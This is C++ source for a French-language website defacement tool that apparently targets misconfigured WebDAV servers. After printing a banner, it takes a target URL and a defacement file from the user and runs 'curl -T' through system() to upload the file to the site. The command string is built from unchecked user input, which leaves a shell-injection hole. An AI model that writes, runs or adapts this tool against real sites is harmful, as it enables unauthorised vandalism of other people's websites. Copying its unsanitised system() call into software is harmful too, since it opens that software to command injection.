#include <iostream>
#include <string>

using namespace std;
namespace Color
{
    enum Code
    {
        FG_RED = 31,
        FG_GREEN = 32,
        FG_BLUE = 34,
        FG_DEFAULT = 39,
        BG_RED = 41,
        BG_GREEN = 42,
        BG_BLUE = 44,
        BG_DEFAULT = 49
    };
    class Modifier
    {
        Code code;

    public:
        Modifier(Code pCode) : code(pCode) {}
        friend std::ostream &
        operator<<(std::ostream &os, const Modifier &mod)
        {
            return os << "\033[" << mod.code << "m";
        }
    };
}

void clear()
{

    system("cls || clear");
}

void banner()
{

    cout << "\033[93m######                                 #####                " << endl;
    cout << "WWWWWWWW                           WWWWWWWWEEEEEEEEEEEEEEEEEEEEEEBBBBBBBBBBBBBBBBB   DDDDDDDDDDDDD                  AAA   VVVVVVVV           VVVVVVVV" << endl;
    cout << "W::::::W                           W::::::WE::::::::::::::::::::EB::::::::::::::::B  D::::::::::::DDD              A:::A  V::::::V           V::::::V" << endl;
    cout << "W::::::W                           W::::::WE::::::::::::::::::::EB::::::BBBBBB:::::B D:::::::::::::::DD           A:::::A V::::::V           V::::::V" << endl;
    cout << "W::::::W                           W::::::WEE::::::EEEEEEEEE::::EBB:::::B     B:::::BDDD:::::DDDDD:::::D         A:::::::AV::::::V           V::::::V" << endl;
    cout << " W:::::W           WWWWW           W:::::W   E:::::E       EEEEEE  B::::B     B:::::B  D:::::D    D:::::D       A:::::::::AV:::::V           V:::::V " << endl;
    cout << "  W:::::W         W:::::W         W:::::W    E:::::E               B::::B     B:::::B  D:::::D     D:::::D     A:::::A:::::AV:::::V         V:::::V  " << endl;
    cout << "   W:::::W       W:::::::W       W:::::W     E::::::EEEEEEEEEE     B::::BBBBBB:::::B   D:::::D     D:::::D    A:::::A A:::::AV:::::V       V:::::V   " << endl;
    cout << "    W:::::W     W:::::::::W     W:::::W      E:::::::::::::::E     B:::::::::::::BB    D:::::D     D:::::D   A:::::A   A:::::AV:::::V     V:::::V    " << endl;
    cout << "     W:::::W   W:::::W:::::W   W:::::W       E:::::::::::::::E     B::::BBBBBB:::::B   D:::::D     D:::::D  A:::::A     A:::::AV:::::V   V:::::V     " << endl;
    cout << "      W:::::W W:::::W W:::::W W:::::W        E::::::EEEEEEEEEE     B::::B     B:::::B  D:::::D     D:::::D A:::::AAAAAAAAA:::::AV:::::V V:::::V      " << endl;
    cout << "       W:::::W:::::W   W:::::W:::::W         E:::::E               B::::B     B:::::B  D:::::D     D:::::DA:::::::::::::::::::::AV:::::V:::::V       " << endl;
    cout << "       W:::::W:::::W   W:::::W:::::W         E:::::E               B::::B     B:::::B  D:::::D     D:::::DA:::::::::::::::::::::AV:::::V:::::V       " << endl;
    cout << "       W:::::W:::::W   W:::::W:::::W         E:::::E               B::::B     B:::::B  D:::::D     D:::::DA:::::::::::::::::::::AV:::::V:::::V       " << endl;
    cout << "       W:::::W:::::W   W:::::W:::::W         E:::::E               B::::B     B:::::B  D:::::D     D:::::DA:::::::::::::::::::::AV:::::V:::::V       " << endl;
    cout << "        W:::::::::W     W:::::::::W          E:::::E       EEEEEE  B::::B     B:::::B  D:::::D    D:::::DA:::::AAAAAAAAAAAAA:::::AV:::::::::V        " << endl;
    cout << "         W:::::::W       W:::::::W         EE::::::EEEEEEEE:::::EBB:::::BBBBBB::::::BDDD:::::DDDDD:::::DA:::::A             A:::::AV:::::::V         " << endl;
    cout << "          W:::::W         W:::::W          E::::::::::::::::::::EB:::::::::::::::::B D:::::::::::::::DDA:::::A               A:::::AV:::::V          " << endl;
    cout << "           W:::W           W:::W           E::::::::::::::::::::EB::::::::::::::::B  D::::::::::::DDD A:::::A                 A:::::AV:::V           " << endl;
    cout << "           W:::W           W:::W           E::::::::::::::::::::EB::::::::::::::::B  D::::::::::::DDD A:::::A                 A:::::AV:::V           " << endl;
    cout << "            WWW             WWW            EEEEEEEEEEEEEEEEEEEEEEBBBBBBBBBBBBBBBBB   DDDDDDDDDDDDD   AAAAAAA                   AAAAAAAVVV  " << endl;
    cout << "" << endl;

}


                                                                                                                                                     
                                                                                                                                                     
int main()
{
    clear();
    banner();

    Color::Modifier BLUE(Color::FG_BLUE);
    Color::Modifier RED(Color::FG_RED);
    cout << BLUE << endl;
    cout << RED << "\n                  NOTE: Seuls les sites Web présentant une vulnérabilité WebDav peuvent être deface!" << BLUE << endl;

    string web;
    cout << "\n\nEntrer le site à deface : ";
    cin >> web;

    char web_back = web.back();

    if (web.find("http") == string::npos)
    {

        clear();
        cout << RED << "Mauvaise URL, veuillez fournir une URL valide\n\n Example: https://example.com/\n\n"
             << endl;
    }

    else if (web_back != '/')
    {

        clear();
        cout << RED << "Mauvaise URL, vous avez oublié d'ajouter '/' à la fin\n\n Example: https://example.com/\n\n"
             << endl;
    }

    else
    {

        string pth;
        cout << BLUE << "Entrer le fichier de la deface : ";
        cin >> pth;
        if (pth == "")
        {
            clear();
            cout << RED << "Fichier index.html introuvable!" << endl;
        }
        else
        {

            cout << RED << endl;
            system(("curl -T " + pth + " " + web + " || cls && echo Curl not found!, Please Download Curl && PAUSE && exit || clear && echo Curl not found!, Please Download Curl && PAUSE && exit ").c_str());
            cout << BLUE << "\nDeface!" << endl;
        }
    }

    system("PAUSE");

    return 0;
}